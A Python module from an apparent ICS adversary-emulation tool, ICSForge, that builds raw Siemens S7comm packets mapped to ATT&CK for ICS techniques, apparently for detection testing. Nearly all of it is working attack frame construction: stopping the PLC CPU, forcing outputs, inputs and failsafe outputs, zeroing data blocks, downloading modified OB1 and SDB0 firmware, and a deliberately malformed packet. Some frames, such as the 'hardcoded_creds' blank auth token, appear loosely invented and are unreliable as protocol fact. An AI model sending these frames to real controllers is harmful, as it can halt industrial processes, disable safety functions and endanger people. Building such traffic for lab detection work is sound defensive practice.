# ICSForge S7comm payload builder — upgraded for ATT&CK for ICS realism
# TPKT (RFC1006) + COTP + S7comm proper PDU structure
import random
import struct

from .common import marker_bytes  # noqa: F401
from .covert_marker import covert_u16

# S7comm ROSCTR (PDU types)
ROSCTR_JOB     = 0x01  # Request (master → PLC)
ROSCTR_ACK     = 0x02  # Acknowledgement
ROSCTR_ACK_DATA= 0x03  # Acknowledgement with data
ROSCTR_USERDATA= 0x07  # Userdata (SZL, CPU functions)

# S7comm Function codes (job ROSCTR)
FC_READ_VAR    = 0x04
FC_WRITE_VAR   = 0x05
FC_REQUEST_DL  = 0x1A  # Request download (program download start)
FC_DOWNLOAD_BLK= 0x1B  # Download block
FC_DOWNLOAD_END= 0x1C  # Download ended
FC_REQUEST_UL  = 0x1D  # Request upload
FC_UPLOAD_BLK  = 0x1E  # Upload block
FC_UPLOAD_END  = 0x1F  # Upload ended
FC_PLC_CONTROL = 0x28  # PLC Control (start/stop/etc)
FC_PLC_STOP    = 0x29  # PLC Stop

# S7 area codes (for var access)
AREA_DB        = 0x84  # Data Block
AREA_INPUTS    = 0x81  # Process Inputs
AREA_OUTPUTS   = 0x82  # Process Outputs
AREA_FLAGS     = 0x83  # Flags (Merker)
AREA_TIMERS    = 0x1D  # Timers
AREA_COUNTERS  = 0x1C  # Counters

# Transport size for var items
TSIZE_BYTE = 0x02
TSIZE_WORD = 0x04
TSIZE_DWORD= 0x06


def _tpkt_cotp(s7_payload: bytes) -> bytes:
    """Wrap S7 payload in TPKT + COTP Data TPDU."""
    cotp = b"\x02\xF0\x80"  # length=2, PDU type=Data(0xF0), TPDU-NR=0x80
    total = 4 + len(cotp) + len(s7_payload)
    tpkt  = struct.pack(">BBH", 0x03, 0x00, total)
    return tpkt + cotp + s7_payload


def _s7_header(rosctr: int, pdu_ref: int, param_len: int, data_len: int) -> bytes:
    return struct.pack(">BBHHHHH",
        0x32,       # Protocol ID
        rosctr,     # PDU type
        0x0000,     # Reserved
        pdu_ref,    # PDU reference (seq)
        param_len,
        data_len,
        0x0000,     # Error class + code (0 = no error)
    )[:10]  # trim to 10 bytes (no error word in JOB)


def _s7_job_header(pdu_ref: int, param_len: int, data_len: int = 0) -> bytes:
    """S7 header for ROSCTR_JOB (no error word)."""
    return struct.pack(">BBHHH",
        0x32, ROSCTR_JOB, 0x0000, pdu_ref & 0xFFFF,
        param_len & 0xFFFF) + struct.pack(">H", data_len & 0xFFFF)


def _var_item(area: int, db_num: int, byte_addr: int, bit_addr: int = 0,
              length: int = 1, tsize: int = TSIZE_WORD) -> bytes:
    """
    S7 variable addressing item — exactly 12 bytes.
    Wire format (S7ANY syntax):
      [0]    item_spec  = 0x12
      [1]    item_len   = 0x0A  (10 more bytes follow)
      [2]    syntax_id  = 0x10  (S7ANY)
      [3]    tsize      (transport size: TSIZE_BIT/BYTE/WORD/DWORD)
      [4-5]  length     (big-endian, number of elements)
      [6-7]  db_num     (big-endian, 0 for non-DB areas)
      [8]    area       (0x81=inputs, 0x82=outputs, 0x83=M, 0x84=DB, ...)
      [9-11] bit_addr   (bit address: byte_offset*8 + bit, packed in 3 bytes)
    """
    # Bit address: byte_addr * 8 + bit_addr, encoded big-endian in 3 bytes
    bit_offset = byte_addr * 8 + bit_addr
    return struct.pack(">BBBBHH",
        0x12,           # item spec
        0x0A,           # item length (10 bytes follow)
        0x10,           # syntax id = S7ANY
        tsize & 0xFF,
        length & 0xFFFF,
        db_num & 0xFFFF,
    ) + bytes([
        area & 0xFF,
        (bit_offset >> 16) & 0xFF,
        (bit_offset >>  8) & 0xFF,
        bit_offset         & 0xFF,
    ])



def _s7_userdata_header(pdu_ref: int, param_len: int, data_len: int = 0) -> bytes:
    """S7 header for ROSCTR_USERDATA (0x07) — 12 bytes including error word."""
    return struct.pack(">BBHHHH BB",
        0x32, ROSCTR_USERDATA, 0x0000, pdu_ref & 0xFFFF,
        param_len & 0xFFFF, data_len & 0xFFFF,
        0x00, 0x00,  # error_class=0x00, error_code=0x00 (no error)
    )

def build_payload(marker: str, style: str = "read_var", **kwargs) -> bytes:
    """
    Build S7comm/TPKT frame.

    Styles:
      setup              ROSCTR_JOB FC_READ_VAR — T0840 initial negotiation
      read_var           FC04 — T0801 Monitor Process State / T0882
      write_var          FC05 — T0855 Unauthorized Command / T0831 Manipulation
      cpu_stop           FC29 — T0813 Denial of Control / T0881 Service Stop
      cpu_start_warm     FC28 ctrl=WARM — T0816 Device Restart
      cpu_start_cold     FC28 ctrl=COLD — T0816 Device Restart
      download_req       FC1A — T0821 Modify Controller Tasking / T0843
      download_block     FC1B — T0824 Full Program Download
      download_end       FC1C — T0821 end of download
      upload_req         FC1D — T0845 Program Upload
      upload_block       FC1E — T0845 upload data
      upload_end         FC1F — T0845 end
      szl_read           ROSCTR_USERDATA SZL-ID — T0868/T0882 Theft of Info
      plc_control        FC28 — T0875 Change Program State
      read_db            FC04 area=DB — T0882 systematic DB extraction
      write_db           FC05 area=DB — T0836 Modify Parameter
      read_outputs       FC04 area=OUTPUTS — T0801 output monitoring
      write_outputs      FC05 area=OUTPUTS — T0876 Loss of Safety
    """
    rnd     = random.Random(kwargs.get("seed"))
    _mode = kwargs.get("marker_mode", "covert" if marker else "none")
    _run = kwargs.get("run_marker", "offline")
    _idx = int(kwargs.get("pkt_index", 0))
    # PDU reference is a genuinely-arbitrary echo/sequence field that stays
    # WITHIN the S7 header's declared Parameter/Data lengths — so in covert
    # mode it carries the marker with zero added bytes and zero malformed-frame
    # risk (unlike an appended marker, which S7's length fields would expose).
    if _mode == "covert" and marker:
        pdu_ref = covert_u16(_run, "s7comm", _idx)
    else:
        pdu_ref = (int(kwargs.get("s7_pdu_ref")) & 0xFFFF) if kwargs.get("s7_pdu_ref") is not None else rnd.randint(1, 0xFFFF)
    # Marker is NOT appended to the payload for S7comm: the Parameter/Data
    # length header fields declare the exact payload size, so trailing bytes
    # would be flagged malformed. Covert mode uses pdu_ref above; explicit
    # mode is unsupported for S7 (would break framing) and falls back to
    # registry-only attribution. mb stays empty.
    mb      = b""
    _ignored_marker_bytes = marker_bytes(marker)  # noqa: F841 — preserved for future inline-marker work

    if style == "setup":
        # Communications Setup (negotiate PDU size)
        param = struct.pack(">BBHHH", 0xF0, 0x00, 0x0001, 0x0001, 0x01E0)  # max PDU=480
        s7    = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "read_var":
        addr   = int(kwargs.get("byte_addr", rnd.randint(0, 200)))
        item   = _var_item(AREA_FLAGS, 0, addr, tsize=TSIZE_BYTE)
        param  = bytes([FC_READ_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "write_var":
        addr   = int(kwargs.get("byte_addr", rnd.randint(0, 200)))
        value  = int(kwargs.get("value",     rnd.randint(0, 0xFF)))
        item   = _var_item(AREA_OUTPUTS, 0, addr, tsize=TSIZE_BYTE)
        data_item = bytes([0x00, 0x04, 0x00, 0x08, value & 0xFF])
        param  = bytes([FC_WRITE_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param), len(data_item)) + param + data_item + mb

    elif style == "cpu_stop":
        # PLC Stop — T0813 Denial of Control / T0881 Service Stop
        pi_service = b"\x50\x5F\x50\x52\x4F\x47\x52\x41\x4D"  # '_PROGRAM' in Siemens naming
        param  = bytes([FC_PLC_STOP, 0x00, 0x00, 0x00, 0x00, 0x00, len(pi_service)]) + pi_service
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "cpu_start_warm":
        # Warm Start — T0816 Device Restart
        # PI-Service (FC 0x28) param: [FC][7 unknown bytes][block_len:2][block][name_len:1][name]
        pi_service = b"P_PROGRAM"
        param  = (bytes([FC_PLC_CONTROL])
                  + b"\x00\x00\x00\x00\x00\x00\xFD"   # 7 unknown bytes
                  + struct.pack(">H", 0)              # parameter block length (empty)
                  + bytes([len(pi_service)]) + pi_service)
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "cpu_start_cold":
        # Cold Start — T0816 Device Restart
        pi_service = b"COLDSTART"
        param  = (bytes([FC_PLC_CONTROL])
                  + b"\x00\x00\x00\x00\x00\x00\xFD"
                  + struct.pack(">H", 0)
                  + bytes([len(pi_service)]) + pi_service)
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "download_req":
        # Request download of OB1 — T0821/T0843
        # Request Download (FC 0x1A) param per Wireshark s7comm dissector:
        #   [0..1]  FC + status
        #   [2..3]  error code (0x0000)
        #   [4..7]  block control header (0x00000100)
        #   [8]     length-of-part-2 = filename(7) + dest_fs(1) = 8
        #   [9..15] filename = '_' + block_type + 5-digit block#
        #   [16]    destination filesystem ASCII ('A'/'B'/'P')
        # block_type ASCII: '0'=OB, '1'=DB, '2'=SDB, '8'=SFC, etc.
        filename = b"_0" + b"00001"   # OB block 1
        param = (bytes([FC_REQUEST_DL, 0x00])
                 + b"\x00\x00"                  # error code
                 + b"\x00\x00\x01\x00"          # block control header
                 + bytes([len(filename) + 1])   # length-of-part-2 = 8
                 + filename + b"A")
        s7    = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "download_block":
        # Download block data chunk — T0824 Full Program Download
        # Same parameter shape as download_req; chunk follows in data section.
        chunk_size = rnd.randint(64, 240)
        chunk_data = bytes([rnd.randint(0, 0xFF) for _ in range(chunk_size)])
        filename = b"_0" + b"00001"
        param = (bytes([FC_DOWNLOAD_BLK, 0x00])
                 + b"\x00\x00"
                 + b"\x00\x00\x01\x00"
                 + bytes([len(filename) + 1])
                 + filename + b"A")
        s7    = _s7_job_header(pdu_ref, len(param), len(chunk_data)) + param + chunk_data + mb

    elif style == "download_end":
        # Download Ended (FC 0x1C) — same parameter layout as Request Download
        filename = b"_0" + b"00001"
        param = (bytes([FC_DOWNLOAD_END, 0x00])
                 + b"\x00\x00"
                 + b"\x00\x00\x01\x00"
                 + bytes([len(filename) + 1])
                 + filename + b"A")
        s7    = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "upload_req":
        # Request Upload (FC 0x1D) — T0845
        # Same shape as Request Download.
        filename = b"_0" + b"00001"
        param = (bytes([FC_REQUEST_UL, 0x00])
                 + b"\x00\x00"
                 + b"\x00\x00\x01\x00"
                 + bytes([len(filename) + 1])
                 + filename + b"A")
        s7    = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "upload_block":
        # Upload Block (FC 0x1E) — chunk is in the data section.
        # Param: FC + status + 4 unknown bytes; uses upload_id from prior REQUEST_UL.
        # Wireshark expects 7 bytes after FC: status(1) + upload_id(4) + 2 unknown
        param = bytes([FC_UPLOAD_BLK, 0x00]) + b"\x00\x00\x00\x00\x00\x00"
        s7    = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "upload_end":
        # Upload Ended (FC 0x1F) — same minimal shape as upload_block.
        param = bytes([FC_UPLOAD_END, 0x00]) + b"\x00\x00\x00\x00\x00\x00"
        s7    = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "szl_read":
        # SZL/SSL read via ROSCTR_USERDATA — T0868/T0882
        # USERDATA parameter (8 bytes) per Wireshark packet-s7comm.c:
        #   [0..2] = param head: 00 01 12
        #   [3]    = type_function: upper nibble=type (0x4=Request),
        #            lower nibble=function group (0x4=CPU functions)
        #   [4]    = subfunction (0x01=Read SZL for CPU group)
        #   [5]    = sequence number
        #   [6]    = data unit reference
        #   [7]    = last data unit flag (0x00=last)
        # Data (8 bytes) for SZL request:
        #   [0]    = return code (0xFF=OK placeholder for request)
        #   [1]    = transport size (0x09=octet string)
        #   [2..3] = data length (0x0004 = 4 bytes of SZL id+idx)
        #   [4..5] = SZL-ID
        #   [6..7] = SZL-INDEX
        szl_id  = int(kwargs.get("szl_id", 0x0011)) & 0xFFFF
        szl_idx = int(kwargs.get("szl_idx", 0x0000)) & 0xFFFF
        param2  = bytes([0x00, 0x01, 0x12, 0x44, 0x01, 0x01, 0x00, 0x00])
        szl_req = bytes([0xFF, 0x09, 0x00, 0x04]) + struct.pack(">HH", szl_id, szl_idx)
        s7      = _s7_userdata_header(pdu_ref, len(param2), len(szl_req)) + param2 + szl_req + mb

    elif style == "plc_control":
        # Generic PLC control (ROSCTR=JOB, FC=0x28) — T0875 Change Program State
        pi_name = kwargs.get("pi_service", b"P_PROGRAM")
        if isinstance(pi_name, str):
            pi_name = pi_name.encode()
        param = bytes([FC_PLC_CONTROL, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFD,
                       0x00, 0x00, len(pi_name)]) + pi_name
        s7    = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "read_db":
        # Read from Data Block — T0882 systematic extraction
        db_num = int(kwargs.get("db_num",   rnd.randint(1, 50))) & 0xFFFF
        byte_a = int(kwargs.get("byte_addr",rnd.randint(0, 200)))
        item   = _var_item(AREA_DB, db_num, byte_a, tsize=TSIZE_WORD)
        param  = bytes([FC_READ_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "write_db":
        # Write to Data Block — T0836 Modify Parameter
        db_num = int(kwargs.get("db_num",   rnd.randint(1, 50))) & 0xFFFF
        byte_a = int(kwargs.get("byte_addr",rnd.randint(0, 200)))
        value  = int(kwargs.get("value",    rnd.randint(0, 0xFFFF))) & 0xFFFF
        item   = _var_item(AREA_DB, db_num, byte_a, tsize=TSIZE_WORD)
        data_item = struct.pack(">BBHH", 0x00, 0x04, 0x00, 0x10) + struct.pack(">H", value)
        param  = bytes([FC_WRITE_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param), len(data_item)) + param + data_item + mb

    elif style == "read_outputs":
        # Read process outputs — T0801 output monitoring
        qty    = int(kwargs.get("quantity", rnd.randint(1, 8)))
        byte_a = int(kwargs.get("byte_addr", 0))
        item   = _var_item(AREA_OUTPUTS, 0, byte_a, length=qty, tsize=TSIZE_BYTE)
        param  = bytes([FC_READ_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "write_outputs":
        # Write to process outputs — T0876 Loss of Safety
        byte_a = int(kwargs.get("byte_addr", rnd.randint(0, 64)))
        value  = int(kwargs.get("value",     0x00)) & 0xFF
        item   = _var_item(AREA_OUTPUTS, 0, byte_a, tsize=TSIZE_BYTE)
        data_item = bytes([0x00, 0x04, 0x00, 0x08, value])
        param  = bytes([FC_WRITE_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param), len(data_item)) + param + data_item + mb

    elif style == "read_inputs":
        # Read AREA_INPUTS (process input image) — T0877 I/O Image
        qty    = int(kwargs.get("quantity", rnd.randint(4, 16)))
        byte_a = int(kwargs.get("byte_addr", 0))
        item   = _var_item(AREA_INPUTS, 0, byte_a, length=qty, tsize=TSIZE_BYTE)
        param  = bytes([FC_READ_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "write_inputs":
        # Write to AREA_INPUTS (normally read-only) — T0835 Manipulate I/O Image
        # Attacker forces PLC to see false sensor values
        byte_a = int(kwargs.get("byte_addr", rnd.randint(0, 32)))
        value  = int(kwargs.get("value", rnd.randint(0, 0xFF))) & 0xFF
        item   = _var_item(AREA_INPUTS, 0, byte_a, tsize=TSIZE_BYTE)
        data_item = bytes([0x00, 0x04, 0x00, 0x08, value])
        param  = bytes([FC_WRITE_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param), len(data_item)) + param + data_item + mb

    elif style == "zero_db":
        # Write zeros to entire Data Block — T0809 Data Destruction
        db_num = int(kwargs.get("db_num", rnd.randint(1, 20))) & 0xFFFF
        qty    = int(kwargs.get("quantity", rnd.randint(20, 80)))
        item   = bytes([0x12, 0x0A, 0x10, 0x04,
                        0x00, qty & 0xFF,
                        (db_num >> 8) & 0xFF, db_num & 0xFF,
                        AREA_DB,
                        0x00, 0x00, 0x00])
        data_item = struct.pack(">BBH", 0x00, 0x04, qty * 16) + b"\x00" * (qty * 2)
        param  = bytes([FC_WRITE_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param), len(data_item)) + param + data_item + mb

    elif style == "firmware_module":
        # Download SDB block (module firmware) — T0839 Module Firmware
        # Request download (FC 0x1A) Job param structure per S7 spec:
        #   [0]      FC = 0x1A
        #   [1]      function status (0x00)
        #   [2..3]   error code (0x0000)
        #   [4..7]   unknown / block control header (0x00000100)
        #   [8]      length of part 2 = filename(7) + dest_fs(1) = 8
        #   [9..15]  filename: '_' + block_type + block_number(5)
        #            block_type ASCII: '0'=OB, '1'=DB, '2'=SDB, '8'=SFC, ...
        #   [16]     destination filesystem ASCII: 'P' (passive), 'A' (active), 'B' (both)
        # Total param = 17 bytes
        filename = b"_2" + b"00001"  # SDB block 1
        param  = (
            bytes([FC_REQUEST_DL, 0x00])     # FC + status
            + b"\x00\x00"                     # error code
            + b"\x00\x00\x01\x00"             # block control header
            + bytes([len(filename) + 1])      # length part 2 = 8
            + filename
            + b"A"                            # destination filesystem
        )
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "firmware_full":
        # Download SDB0 (full system firmware replacement) — T0857 System Firmware
        # Same parameter shape as firmware_module but with block "00000" (SDB0)
        # and a chunk of payload data.
        filename = b"_2" + b"00000"
        chunk    = bytes([rnd.randint(0, 0xFF) for _ in range(240)])
        param    = (
            bytes([FC_REQUEST_DL, 0x00])
            + b"\x00\x00"
            + b"\x00\x00\x01\x00"
            + bytes([len(filename) + 1])
            + filename
            + b"A"
        )
        s7       = _s7_job_header(pdu_ref, len(param), len(chunk)) + param + chunk + mb

    elif style == "download_sdb0":
        # Download block chunk for SDB0 firmware — T0895 Autorun Image
        # SDB0 is loaded on every PLC boot cycle. Same Download Block param
        # shape as download_block; chunk in data section.
        chunk    = bytes([rnd.randint(0, 0xFF) for _ in range(200)])
        filename = b"_2" + b"00000"   # SDB block 0
        param    = (bytes([FC_DOWNLOAD_BLK, 0x00])
                    + b"\x00\x00"
                    + b"\x00\x00\x01\x00"
                    + bytes([len(filename) + 1])
                    + filename + b"A")
        s7       = _s7_job_header(pdu_ref, len(param), len(chunk)) + param + chunk + mb

    elif style == "szl_clear":
        # SZL USERDATA request to access diagnostic buffer — T0872 Indicator Removal on Host
        # Uses SZL Read (subfunction 0x01) with SZL ID 0x00A0 (diag buffer).
        # Real "clear" requires a separate write subfunction; we model the
        # reconnaissance step that precedes a clear, which is the actually
        # observable T0872 traffic on the wire.
        param2  = bytes([0x00, 0x01, 0x12, 0x44, 0x01, 0x01, 0x00, 0x00])
        szl_req = bytes([0xFF, 0x09, 0x00, 0x04]) + struct.pack(">HH", 0x00A0, 0x0000)
        s7      = _s7_userdata_header(pdu_ref, len(param2), len(szl_req)) + param2 + szl_req + mb

    elif style == "program_mode":
        # Set PLC to PROGRAM mode (allows ladder logic writes) — T0858 Change Operating Mode
        # PI-Service (FC 0x28) param: see cpu_start_warm comment.
        pi_name = b"P_PROGRAM"
        param  = (bytes([FC_PLC_CONTROL])
                  + b"\x00\x00\x00\x00\x00\x00\xFD"
                  + struct.pack(">H", 0)
                  + bytes([len(pi_name)]) + pi_name)
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "write_failsafe":
        # Write to F-CPU (failsafe) output area — T0880 Loss of Safety
        # F-CPUs (315F, 317F) have safety-rated outputs at area 0x82 with F-module addressing
        byte_a = int(kwargs.get("byte_addr", rnd.randint(0, 16)))
        item   = _var_item(AREA_OUTPUTS, 0, byte_a, length=4, tsize=TSIZE_BYTE)
        data_item = bytes([0x00, 0x04, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00])  # all zeros
        param  = bytes([FC_WRITE_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param), len(data_item)) + param + data_item + mb

    elif style == "malformed_param":
        # INTENTIONALLY MALFORMED — T0866 Exploitation of Remote Services
        # Sends more parameters than PDU negotiation allows, triggering an
        # exception in the target. This style is designed to violate spec; the
        # packet WILL appear as [Malformed Packet] in Wireshark, which is the
        # whole point — it tests detection-of-exploitation rules. Do NOT
        # "fix" it. Tag as lab-only in scenario audits.
        bad_param = bytes([FC_READ_VAR, 0xFF]) + b"\x12\x0A\x10\x02" * 20  # 20 items, way over limit
        s7    = _s7_job_header(pdu_ref, len(bad_param)) + bad_param + mb

    elif style == "hardcoded_creds":
        # S7comm setup with hardcoded Siemens default auth — T0891 Hardcoded Credentials
        # Siemens S7-300/400 with no password protection uses blank auth in setup PDU
        param  = struct.pack(">BBHHH", 0xF0, 0x00, 0x0001, 0x0001, 0x01E0)
        # Append known hardcoded session token (empty = default Siemens credential)
        auth   = b"\x00" * 4  # blank password token
        s7     = _s7_job_header(pdu_ref, len(param) + len(auth)) + param + auth + mb

    elif style == "tool_transfer_db":
        # Download large binary blob as DB block — T0867 Lateral Tool Transfer
        # Attacker encodes a tool payload inside a Siemens DB block
        db_size = int(kwargs.get("size", rnd.randint(180, 240)))
        chunk   = bytes([rnd.randint(0x20, 0x7E) for _ in range(db_size)])  # printable-range binary
        param   = bytes([FC_DOWNLOAD_BLK, 0x00]) + struct.pack(">H", db_size) + b"\x00\x00"
        s7      = _s7_job_header(pdu_ref, len(param), db_size) + param + chunk + mb

    elif style == "default_creds":
        # S7comm session with vendor default (blank) password — T0812 Default Credentials
        param  = struct.pack(">BBHHH", 0xF0, 0x00, 0x0001, 0x0001, 0x00F0)
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "read_all_dbs":
        # Systematically read multiple DB blocks — T0811/T0893 Data from Local System
        db_num = int(kwargs.get("db_num", rnd.randint(1, 100))) & 0xFFFF
        item   = _var_item(AREA_DB, db_num, 0, length=126, tsize=TSIZE_WORD)
        param  = bytes([FC_READ_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "modify_ob1":
        # Upload OB1, then re-download modified — T0873 Project File Infection / T0889 Modify Program
        # This frame: Request Upload (FC 0x1D) for OB block 1.
        filename = b"_0" + b"00001"
        param  = (bytes([FC_REQUEST_UL, 0x00])
                  + b"\x00\x00"
                  + b"\x00\x00\x01\x00"
                  + bytes([len(filename) + 1])
                  + filename + b"A")
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "modified_ob1_dl":
        # Download modified OB1 back — T0873 / T0889 second phase
        # Request Download (FC 0x1A) for OB block 1.
        filename = b"_0" + b"00001"
        param  = (bytes([FC_REQUEST_DL, 0x00])
                  + b"\x00\x00"
                  + b"\x00\x00\x01\x00"
                  + bytes([len(filename) + 1])
                  + filename + b"A")
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "native_cotp":
        # Raw COTP connection request without S7 layer — T0834 Native API
        # Connects at transport layer only, using lower-level COTP API directly.
        # COTP CR per ISO 8073:
        #   length(1)  = total bytes after the length field itself
        #   PDU code   = 0xE0 (Connection Request)
        #   dst-ref(2), src-ref(2)
        #   class+options(1)
        #   variable params: TPDU size, src/dst TSAP
        cotp_cr = bytes([
            0x11,        # length = 17 (bytes that follow)
            0xE0,        # CR
            0x00, 0x00,  # dst-ref
            0x00, 0x01,  # src-ref
            0x00,        # class 0, option 0
            0xC0, 0x01, 0x0A,           # TPDU size = 1024
            0xC1, 0x02, 0x01, 0x00,     # src-TSAP
            0xC2, 0x02, 0x01, 0x02,     # dst-TSAP
        ])
        total   = 4 + len(cotp_cr)
        tpkt    = struct.pack(">BBH", 0x03, 0x00, total)
        return tpkt + cotp_cr + mb

    elif style == "lateral_pivot":
        # S7comm session from unexpected IP to establish beachhead — T0886 Remote Services
        param  = struct.pack(">BBHHH", 0xF0, 0x00, 0x0001, 0x0001, 0x01E0)
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    else:
        # Fallback: read_var
        item  = bytes([0x12, 0x0A, 0x10, 0x02, 0x00, 0x01, 0x00, 0x00, AREA_FLAGS, 0x00, 0x00, 0x00])
        param = bytes([FC_READ_VAR, 0x01]) + item
        s7    = _s7_job_header(pdu_ref, len(param)) + param + mb

    return _tpkt_cotp(s7)
